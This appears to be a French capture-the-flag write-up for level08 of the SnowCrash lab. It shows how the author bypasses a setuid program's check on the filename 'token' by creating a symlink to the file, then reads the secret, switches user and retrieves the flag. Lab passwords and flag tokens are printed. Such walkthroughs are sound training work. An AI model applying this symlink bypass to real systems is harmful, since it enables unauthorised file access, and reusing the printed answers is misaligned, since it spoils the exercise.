# Level08

Une fois connecté avec le username:motdepasse level08:fiumuikeil55xe9cu4dood66h (obtenu dans le flag précédent), nous arrivons sur le home de l'utilisateur level08.  
Nous y trouvons un fichier et un exécutable.  
Effectuons quelques tests :  
```sh
level08@SnowCrash:~$ ls
level08  token
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ touch /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
level08@SnowCrash:~$ echo "hello" > /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
hello
```

Nous pouvons voir que l'exécutable prend en paramétre un fichier et le lis, pourtant il ne marche pas avec `token`.  
Du coté de `strings level08` nous avons :  
```
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
```
Nous pouvons supposer que l'exécutable ne lis pas le fichier si il porte le nom `token`.
```sh
level08@SnowCrash:~$ touch /tmp/token
level08@SnowCrash:~$ ./level08 /tmp/token
You may not access '/tmp/token'
```
Effectivement les fichers nommé "token" ne sont pas lu.  
Nous allons faire un lien symbolique sur le fichier token afin qu'il puisse être lu par l'exécutable :  
```sh
level08@SnowCrash:~$ ln -s ~/token /tmp/flag
level08@SnowCrash:~$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
